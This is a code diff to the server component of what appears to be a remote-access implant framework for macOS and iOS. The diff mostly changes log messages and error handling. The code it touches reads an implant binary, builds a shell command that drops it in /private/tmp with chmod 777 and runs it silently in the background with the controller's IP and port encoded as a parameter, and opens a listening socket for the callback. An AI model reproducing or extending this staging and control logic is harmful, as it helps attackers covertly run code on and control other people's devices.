@@ -109,16 +109,15 @@ class Server:
         payload_parameter = h.b64(json.dumps(
             {"ip": self.host, "port": self.port, "debug": self.debug}).encode())
         if device_arch.decode() in self.macos_architectures:
-            self.verbose_print("Detected macOS")
+            self.verbose_print("Detected macOS (" + str(device_arch.decode()) + ")")
             f = open("resources/esplmacos", "rb")
             payload = f.read()
             f.close()
-            # save to tmp,
             instructions = ("cat >/private/tmp/tmpespl;" + "chmod 777 /private/tmp/tmpespl;" +
                             "mv /private/tmp/tmpespl /private/tmp/espl;" + "/private/tmp/espl " + payload_parameter.decode() + " 2>/dev/null &\n")
             return (instructions, payload)
-        elif device_arch in self.ios_architectures:
-            self.verbose_print("Detected iOS")
+        elif device_arch.decode() in self.ios_architectures:
+            self.verbose_print("Detected iOS (" + str(device_arch.decode()) + ")")
             f = open("resources/esplios", "rb")
             payload = f.read()
             f.close()
@@ -152,7 +151,10 @@ class Server:
         # listen for connection
         s = socket.socket()
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        s.bind(('0.0.0.0', self.port))
+        try:
+          s.bind(('0.0.0.0', self.port))
+        except Exception:
+          h.info_error("Port/Address already in use!")
         s.listen(1)
         self.verbose_print("Listening on port "+str(self.port)+"...")
         try:
